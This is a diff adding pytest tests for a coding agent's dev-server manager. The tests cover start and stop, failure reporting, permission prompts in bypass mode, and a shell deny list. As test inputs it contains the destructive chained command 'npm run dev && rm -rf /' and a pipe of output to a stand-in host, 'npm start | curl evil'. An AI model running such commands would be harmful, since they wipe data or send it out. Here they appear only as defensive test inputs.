@@ -11,6 +11,7 @@ import json
 import os
 import sqlite3
 import subprocess
+import sys
 import threading
 import time
 from concurrent.futures import Future
@@ -2983,6 +2984,112 @@ def test_browser_schema_budget_stays_small_enough_for_local_models(tmp_path):
     assert cost < 1_600, f"browser schemas cost {cost} tokens"
     names = {schema["function"]["name"] for schema in core.tool_registry.browser_schemas()}
     assert len(names) <= 15, sorted(names)
+
+
+def test_dev_server_starts_probes_and_stops(tmp_path):
+    import socket as socket_mod
+
+    from ollama_code.devserver import DevServerManager
+
+    with socket_mod.socket() as probe:
+        probe.bind(("127.0.0.1", 0))
+        port = probe.getsockname()[1]
+
+    manager = DevServerManager(perms=PermissionManager(mode="ask"))
+    listener = (
+        "import socket, time\n"
+        f"s = socket.socket(); s.bind((\"127.0.0.1\", {port})); s.listen()\n"
+        "print(\"listening\", flush=True)\n"
+        "time.sleep(60)\n"
+    )
+    result = manager.start(
+        command=f"{sys.executable} -c '{listener}'",
+        cwd=str(tmp_path),
+        port=port,
+        name="fixture",
+    )
+    assert result["ready"] is True
+    assert result["running"] is True
+
+    snapshots = manager.status()
+    assert len(snapshots) == 1
+    assert snapshots[0]["name"] == "fixture"
+    # The banner is readable through status — there is no Console stream.
+    deadline = time.monotonic() + 5
+    while time.monotonic() < deadline and "listening" not in manager.status()[0]["tail"]:
+        time.sleep(0.05)
+    assert "listening" in manager.status()[0]["tail"]
+
+    assert manager.stop("fixture") == ["fixture"]
+    assert manager.status() == []
+
+
+def test_dev_server_reports_a_command_that_dies(tmp_path):
+    from ollama_code.devserver import DevServerManager
+
+    manager = DevServerManager(perms=PermissionManager(mode="ask"))
+    result = manager.start(
+        command=f"{sys.executable} -c 'print(\"broken config\"); raise SystemExit(3)'",
+        cwd=str(tmp_path),
+        port=59_999,
+        name="dying",
+    )
+    # The failure comes back with the output that explains it, not a timeout.
+    assert result["ready"] is False
+    assert result["reason"] == "exited"
+    deadline = time.monotonic() + 5
+    while time.monotonic() < deadline and "broken config" not in manager.status()[0]["tail"]:
+        time.sleep(0.05)
+    assert "broken config" in manager.status()[0]["tail"]
+    manager.stop_all()
+
+
+def test_dev_server_honours_the_shell_deny_list(tmp_path):
+    from ollama_code.devserver import DevServerError, DevServerManager
+
+    perms = PermissionManager(mode="ask", deny_commands=["rm -rf /"])
+    manager = DevServerManager(perms=perms)
+    # Chained segments are scanned the way the console scans them: a safe
+    # prefix cannot smuggle a denied command in behind it.
+    with pytest.raises(DevServerError, match="deny list"):
+        manager.start(command="npm run dev && rm -rf /", cwd=str(tmp_path))
+    with pytest.raises(DevServerError, match="background"):
+        manager.start(command="npm run dev &", cwd=str(tmp_path))
+
+
+def test_dev_server_tool_never_crosses_the_socket(client):
+    # browser_dev_server executes in the agent process: no
+    # browser_action_request may be emitted, so a headless backend answers it
+    # without any native broker attached.
+    with client.websocket_connect("/ws/chat") as ws:
+        assert ws.receive_json()["type"] == "session_info"
+        ws.send_json({"type": "set_browser_control", "enabled": True})
+        events = drain(ws)
+        assert {"type": "browser_control_status", "enabled": True} in [
+            {"type": e.get("type"), "enabled": e.get("enabled")} for e in events
+        ]
+
+    svc = client.app.state.service
+    result = svc.execute_browser("browser_dev_server", {"action": "status"}, "req-1")
+    assert result == "No dev servers are running."
+    assert svc.pending_browser_actions == {}
+
+
+def test_dev_server_permission_posture():
+    perms = PermissionManager(mode="bypass")
+    # Starting a server keeps asking even in Bypass, exactly like page JS.
+    assert perms.requires_confirmation("browser_dev_server", {"action": "start"})
+    # And the deny list is unoverridable, exactly like bash.
+    denying = PermissionManager(mode="bypass", deny_commands=["curl"])
+    assert denying.blocked_reason(
+        "browser_dev_server", {"action": "start", "command": "npm start | curl evil"}
+    ) is not None
+    assert denying.blocked_reason(
+        "browser_dev_server", {"action": "start", "command": "npm run dev"}
+    ) is None
+
+    summary, _ = build_preview("browser_dev_server", {"action": "start", "command": "npm run dev"})
+    assert summary == "start dev server: $ npm run dev"
 
 
 def test_steer_continues_same_turn_without_intermediate_turn_done(tmp_path):
